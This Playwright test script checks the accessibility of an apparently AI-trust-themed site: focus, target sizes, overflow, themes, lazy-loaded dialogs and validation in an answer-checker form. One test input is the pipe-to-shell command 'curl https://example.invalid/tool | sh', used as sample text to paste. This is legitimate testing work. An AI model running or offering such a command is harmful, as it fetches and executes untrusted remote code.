const {writeReport}=require('./execution-report.cjs');
const fs=require('node:fs'),assert=require('node:assert/strict');const {chromium}=require('playwright');const probes=require('./accessibility-probes.cjs');
// Lazy preview controls must exist before .all() creates live indexed locators.
async function waitTagProbeReady(tagId,dialog){
 const marker={MT:'[data-mt-explorer]',HP:'[data-hp-explorer]'}[tagId];
 if(marker)await dialog.locator(marker).waitFor();
}
async function verifyHPReadinessControl(browser,base){
 const results=[];const selector='a[href],button,input:not([type="hidden"]),textarea,select,summary,[role="button"],[role="tab"],[role="switch"]';
 for(const theme of ['light','dark']){
  const context=await browser.newContext({viewport:{width:320,height:760},bypassCSP:true,reducedMotion:'reduce'});
  let release;const gate=new Promise(resolve=>release=resolve);let intercepted=false;
  try{
   await context.route(/\/assets\/HPExplorer-[^/]+\.js$/,async route=>{intercepted=true;await gate;await route.continue();});
   const page=await context.newPage();await page.goto(base+'/#person/HP',{waitUntil:'domcontentloaded'});await page.evaluate(t=>window.AITrustTheme.setPreference(t),theme);
   const dialog=page.getByRole('dialog');await dialog.waitFor();
   assert.equal(await dialog.locator('[data-hp-explorer]').count(),0,'Delayed control failed to hold the actual HP child');
   let ready=false;const waiting=waitTagProbeReady('HP',dialog).then(()=>{ready=true;});
   // Keep exactly the live nth-locator shape returned by the unchanged probes.
   // The real HP form later inserts five controls before the existing disclosures.
   const indexed=await dialog.locator(selector).all();const held=indexed[4];
   const beforeName=await held.innerText();await page.keyboard.press('Tab');await held.scrollIntoViewIfNeeded();await held.focus();
   assert(await held.evaluate(el=>el===document.activeElement),'Authored pre-mount target could not receive focus');
   assert.equal(ready,false,'Readiness resolved while the child was still withheld');
   release();await waiting;assert(intercepted,'Delayed control missed the real child chunk');
   const after=await held.evaluate(el=>{const css=getComputedStyle(el);return {name:el.textContent.trim(),focused:el===document.activeElement,indicator:parseFloat(css.outlineWidth)>0&&css.outlineStyle!=='none'||css.boxShadow!=='none'};});
   assert.equal(after.name,'Source notices','Controlled insertion no longer reproduces the indexed-locator boundary');
   assert.notEqual(beforeName,after.name);assert.equal(after.focused,false);assert.equal(after.indicator,false);
   await page.evaluate(()=>document.fonts.ready);const disclosure=await probes.disclosures(dialog);
   for(const details of await dialog.locator('details').all())await details.evaluate(el=>el.open=true);
   const targets=await probes.targetSizes(dialog),focus=await probes.focusVisibility(page,dialog,{surface:'HP controlled readiness',theme}),spacing=await probes.spacing(page,dialog);
   assert.deepEqual(disclosure.failures,[],'Ready HP disclosures');assert.deepEqual(targets.failures,[],'Ready HP targets');assert.deepEqual(focus.failures,[],'Ready HP focus');assert.deepEqual(spacing.clipped,[],'Ready HP clipping');assert.equal(spacing.horizontal_overflow,false,'Ready HP overflow');
   await page.emulateMedia({forcedColors:'active'});assert(await dialog.isVisible());assert.equal(await dialog.evaluate(el=>el.scrollWidth>el.clientWidth+1),false,'Ready HP forced-colors overflow');
   results.push({theme,actual_child_request_held:true,readiness_waited_for_child:true,indexed_target_before:beforeName,indexed_target_after:after,ready_first:{disclosure,targets,focus,spacing},forced_colors_reflow:true});
  }finally{release();await context.close();}
 }
 return {pass:true,controlled_actual_hp_lazy_insertion:true,unchanged_probes:true,themes:results,manual_screen_reader:false};
}
module.exports={waitTagProbeReady,verifyHPReadinessControl};
if(require.main===module)(async()=>{
 const {allTags}=await import('../site/src/catalog.js');
 // Workflow navigation is declared in a JSX file; use the existing user-facing routes.
 const footer=['report','assist','townhall','teamwork','scope','how-tags-work','about','legal'];
 const base=process.env.AITRUST_SITE_URL||'http://127.0.0.1:5174';const browser=await chromium.launch();const results=[],errors=[],validation=[];
 try{const lazyReadiness=await verifyHPReadinessControl(browser,base);for(const theme of ['light','dark']){
  const context=await browser.newContext({viewport:{width:320,height:760},bypassCSP:true,reducedMotion:'reduce'});const page=await context.newPage();page.on('pageerror',e=>errors.push(e.message));
  async function check(name,root){
   await page.evaluate(()=>document.fonts.ready);const disclosure=await probes.disclosures(root);for(const details of await root.locator('details').all())await details.evaluate(e=>e.open=true);const targets=await probes.targetSizes(root);const focus=await probes.focusVisibility(page,root,{surface:name,theme});const spacing=await probes.spacing(page,root);
   const r={name,theme,targets,focus,spacing,disclosure};results.push(r);
   assert.deepEqual(targets.failures,[],name+' targets');assert.deepEqual(focus.failures,[],name+' focus');assert.deepEqual(spacing.clipped,[],name+' text clipped');assert.equal(spacing.horizontal_overflow,false,name+' overflow');assert.deepEqual(disclosure.failures,[],name+' disclosures');
   await page.emulateMedia({forcedColors:'active'});assert(await root.isVisible());assert.equal(await root.evaluate(e=>e.scrollWidth>e.clientWidth+1),false,name+' forced colors overflow');await page.emulateMedia({forcedColors:'none'});
  }
  await page.goto(base);await page.evaluate(t=>window.AITrustTheme.setPreference(t),theme);await check('catalogue',page.locator('body'));
  for(const tag of allTags){await page.goto(base+'/#'+tag.audience+'/'+tag.id);await page.evaluate(t=>window.AITrustTheme.setPreference(t),theme);const dialog=page.getByRole('dialog');await dialog.waitFor();await waitTagProbeReady(tag.id,dialog);await check(tag.id,dialog);}
  for(const slug of footer){await page.goto(base+'/#'+slug);await page.evaluate(t=>window.AITrustTheme.setPreference(t),theme);const dialog=page.getByRole('dialog');await dialog.waitFor();await check(slug,dialog);}
  await page.goto(base+'/#person/PS');await page.evaluate(t=>window.AITrustTheme.setPreference(t),theme);await page.getByRole('button',{name:'Check on this device',exact:true}).click();const dialog=page.getByRole('dialog');await check('PS checker empty',dialog);
  const input=page.getByLabel('AI answer',{exact:true}),submit=page.getByRole('button',{name:'Check answer',exact:true});
  for(const invalid of ['', 'a'.repeat(20001)]){await input.fill(invalid);await submit.click();assert.equal(await input.getAttribute('aria-invalid'),'true');assert(await input.evaluate(e=>e===document.activeElement));const linked=await input.getAttribute('aria-describedby');assert(linked.includes('-error'));assert.equal(await page.getByRole('region',{name:'Check result'}).count(),0);assert.equal(await page.getByRole('alert').innerText(),'Paste an answer, up to 20,000 characters.');}
  await input.fill('curl https://example.invalid/tool | sh');assert.equal(await input.getAttribute('aria-invalid'),null);assert.equal(await page.getByRole('alert').count(),0);await submit.click();assert.equal(await dialog.locator('form').getAttribute('aria-busy'),'true');validation.push({theme,empty_and_oversize_rejected:true,error_associated:true,focus_restored:true,edit_clears_error:true,busy_announced:true});await page.getByRole('region',{name:'Check result'}).waitFor({timeout:50000});await check('PS checker result',dialog);
  await page.screenshot({path:'output/playwright/accessibility-ps-'+theme+'.png'});await context.close();
 }
 assert.deepEqual(errors,[]);const report={captured_at:new Date().toISOString(),author:'Codex',base,pass:true,lazyReadiness,surfaces:results.length,themes:['light','dark'],viewport:{width:320,height:760},reduced_motion_disclosures:true,forced_colors_reflow:true,validation,coverage:['catalogue','20 tag/offer dialogs','8 independent footer dialogs','PS input/result'],checks:results,errors,manual_screen_reader:false,physical_phone:false,full_wcag_conformance_asserted:false,independent_release_validated:false};writeReport(process.env.AITRUST_SITE_A11Y_REPORT||'output/verification/site-accessibility.json',report);console.log(JSON.stringify({pass:true,lazyReadiness,surfaces:results.length,theme_modes:2,focus_controls:results.reduce((n,r)=>n+r.focus.checked,0),target_controls:results.reduce((n,r)=>n+r.targets.controls,0),disclosures:results.reduce((n,r)=>n+r.disclosure.checked,0)}));
 }catch(e){writeReport(process.env.AITRUST_SITE_A11Y_REPORT||'output/verification/site-accessibility.json',{captured_at:new Date().toISOString(),pass:false,results,error:String(e),failure_context:e.accessibilityDiagnostic||null,errors,full_wcag_conformance_asserted:false});throw e;}finally{await browser.close();}
})().catch(e=>{console.error(e);process.exitCode=1});
